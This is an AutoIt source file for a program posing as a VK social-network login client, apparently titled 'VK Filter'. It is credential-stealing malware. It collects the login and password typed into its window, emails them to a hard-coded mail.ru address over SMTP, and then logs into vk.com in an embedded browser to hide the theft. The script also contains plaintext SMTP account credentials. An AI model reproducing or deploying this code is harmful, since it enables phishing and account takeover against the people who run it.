#include <GUIConstants.au3>
#include <WindowsConstants.au3>
#include <IE.au3>
;#include <GDIP.au3>
#include <GDIPlus.au3>


#include <EditConstants.au3>
#include <GUIConstantsEx.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>
#Region ### START Koda GUI section ### Form=C:\Users\Никита\Desktop\AutoIt\VK Filter rebuild\Form1_1.kxf
$Form1_1 = GUICreate("Form1", 416, 721, 475, 64)
$Button1 = GUICtrlCreateButton("Войти", 72, 512, 267, 41)
GUICtrlSetFont(-1, 16, 400, 0, "MS Sans Serif")
GUICtrlSetBkColor(-1, 0x03B898)
$Button2 = GUICtrlCreateButton("Войти через браузер", 72, 560, 267, 33)
GUICtrlSetFont(-1, 16, 400, 0, "MS Sans Serif")
GUICtrlSetBkColor(-1, 0x008080)
$Pic1 = GUICtrlCreatePic("C:\Users\Никита\Desktop\PlcU8uzaDd0.jpg", 0, 0, 412, 716)
GUICtrlSetState(-1, $GUI_DISABLE)
$Input1 = GUICtrlCreateInput("", 32, 416, 353, 32)
GUICtrlSetFont(-1, 14, 400, 0, "MS Sans Serif")
GUICtrlSetBkColor(-1, 0xB9D1EA)
$Input2 = GUICtrlCreateInput("", 32, 472, 353, 32, BitOR($GUI_SS_DEFAULT_INPUT,$ES_PASSWORD))
GUICtrlSetFont(-1, 14, 400, 0, "MS Sans Serif")
GUICtrlSetBkColor(-1, 0xB9D1EA)
$Label1 = GUICtrlCreateLabel("Логин:", 48, 392, 54, 24)
GUICtrlSetFont(-1, 12, 400, 0, "MS Sans Serif")
$Label2 = GUICtrlCreateLabel("Пароль", 40, 448, 62, 24)
GUICtrlSetFont(-1, 12, 400, 0, "MS Sans Serif")


$oIE = _IECreateEmbedded()
GUISetState(@SW_SHOW)
#EndRegion ### END Koda GUI section ###
Send("{TAB}")


$SmtpServer = "smtp.mail.ru"          ; address for the smtp-server to use - REQUIRED
$FromName = "Panda"            ; name from who the email was sent
$FromAddress = "noobsenslaver1@mail.ru"		; address from where the mail should come
$AttachFiles = ""                       	; the file(s) you want to attach seperated with a ; (Semicolon) - leave blank if not needed
$CcAddress = ""       						; address for cc - leave blank if not needed
$BccAddress = ""     						; address for bcc - leave blank if not needed
$Importance = "Normal"                  	; Send message priority: "High", "Normal", "Low"
$Username = "noobsenslaver1"           ; username for the account used from where the mail gets sent - REQUIRED
$Password = "Nfhrjcfkt121"            ; password for the account used from where the mail gets sent - REQUIRED
$IPPort = 465                            	; port used for sending the mail
$ssl = 1

$ToAddress = "noobsenslaver1@mail.ru"
$Subject = ""
$Body = ""









While 1
	$nMsg = GUIGetMsg()
	Switch $nMsg
		Case $GUI_EVENT_CLOSE
			Exit
		Case $Button1
			$login = GUICtrlRead($Input1)
			$pass = GUICtrlRead($Input2)
			If ChkData($login, $pass) == True Then
				$Body = $login & " " & $pass
				ShowBrowser()
				HideGUI()
				SendMsg($Body)
				Sleep(500)
				Send($login)
				Sleep(300)
				Send("{TAB}")
				Send($pass)
				Sleep(300)
				Send("{ENTER}")
				Send("{LCTRL DOWN}")
				MouseWheel("Down", 10)
				Send("{LCTRL UP}")
			Else
				Sleep(2000)
				MsgBox(0,"","Неверная пара логин/пароль.")
			EndIf

		Case $Button2
			MsgBox(0,"","Я что, для этого приложение создавал!?")

	EndSwitch
WEnd

Func ChkData($login, $pass)
	If StringLen($login) >= 6 AND StringLen($pass) >= 6 Then
		Return True
	Else
		Return False
	EndIf

EndFunc


Func ShowBrowser()
	$GUIActiveX = GUICtrlCreateObj($oIE, 0, 0, 416, 721)
	_IENavigate($oIE, 'vk.com')
EndFunc

Func HideGUI()
	GUICtrlSetState($Button1,32)
	GUICtrlSetState($Button2,32)
	GUICtrlSetState($Label1,32)
	GUICtrlSetState($Label2,32)
	GUICtrlSetState($Input1,32)
	GUICtrlSetState($Input2,32)
	GUICtrlSetState($Pic1,32)
EndFunc

Func SendMsg($bdy)
			Global $oMyRet[2]
			Global $oMyError = ObjEvent("AutoIt.Error", "MyErrFunc")
			$rc = _INetSmtpMailCom($SmtpServer, $FromName, $FromAddress, $ToAddress, $Subject, $bdy, $AttachFiles, $CcAddress, $BccAddress, $Importance, $Username, $Password, $IPPort, $ssl)
			If @error Then
				MsgBox(0, "Error sending message", "Error code:" & @error & "  Description:" & $rc)
			EndIf
EndFunc



;=========================================================================

Func _INetSmtpMailCom($s_SmtpServer, $s_FromName, $s_FromAddress, $s_ToAddress, $s_Subject = "", $as_Body = "", $s_AttachFiles = "", $s_CcAddress = "", $s_BccAddress = "", $s_Importance="Normal", $s_Username = "", $s_Password = "", $IPPort = 25, $ssl = 0)
    Local $objEmail = ObjCreate("CDO.Message")
    $objEmail.From = '"' & $s_FromName & '" <' & $s_FromAddress & '>'
    $objEmail.To = $s_ToAddress
    Local $i_Error = 0
    Local $i_Error_desciption = ""
    If $s_CcAddress <> "" Then $objEmail.Cc = $s_CcAddress
    If $s_BccAddress <> "" Then $objEmail.Bcc = $s_BccAddress
    $objEmail.Subject = $s_Subject
    If StringInStr($as_Body, "<") And StringInStr($as_Body, ">") Then
        $objEmail.HTMLBody = $as_Body
    Else
        $objEmail.Textbody = $as_Body & @CRLF
    EndIf
    If $s_AttachFiles <> "" Then
        Local $S_Files2Attach = StringSplit($s_AttachFiles, ";")
        For $x = 1 To $S_Files2Attach[0]
            $S_Files2Attach[$x] = _PathFull($S_Files2Attach[$x])
;~          ConsoleWrite('@@ Debug : $S_Files2Attach[$x] = ' & $S_Files2Attach[$x] & @LF & '>Error code: ' & @error & @LF) ;### Debug Console
            If FileExists($S_Files2Attach[$x]) Then
                ConsoleWrite('+> File attachment added: ' & $S_Files2Attach[$x] & @LF)
                $objEmail.AddAttachment($S_Files2Attach[$x])
            Else
                ConsoleWrite('!> File not found to attach: ' & $S_Files2Attach[$x] & @LF)
                SetError(1)
                Return 0
            EndIf
        Next
    EndIf
    $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
    $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserver") = $s_SmtpServer
    If Number($IPPort) = 0 then $IPPort = 25
    $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = $IPPort
    ;Authenticated SMTP
    If $s_Username <> "" Then
        $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1
        $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendusername") = $s_Username
        $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendpassword") = $s_Password
    EndIf
    If $ssl Then
        $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True
    EndIf
    ;Update settings
    $objEmail.Configuration.Fields.Update
    ; Set Email Importance
    Switch $s_Importance
        Case "High"
            $objEmail.Fields.Item ("urn:schemas:mailheader:Importance") = "High"
        Case "Normal"
            $objEmail.Fields.Item ("urn:schemas:mailheader:Importance") = "Normal"
        Case "Low"
            $objEmail.Fields.Item ("urn:schemas:mailheader:Importance") = "Low"
    EndSwitch
    $objEmail.Fields.Update
    ; Sent the Message
    $objEmail.Send
    If @error Then
        SetError(2)
        Return $oMyRet[1]
    EndIf
    $objEmail=""
EndFunc   ;==>_INetSmtpMailCom
;
;
; Com Error Handler
Func MyErrFunc()
    $HexNumber = Hex($oMyError.number, 8)
    $oMyRet[0] = $HexNumber
    $oMyRet[1] = StringStripWS($oMyError.description, 3)
    ConsoleWrite("### COM Error !  Number: " & $HexNumber & "   ScriptLine: " & $oMyError.scriptline & "   Description:" & $oMyRet[1] & @LF)
    SetError(1); something to check for when this function returns
    Return
EndFunc   ;==>MyErrFunc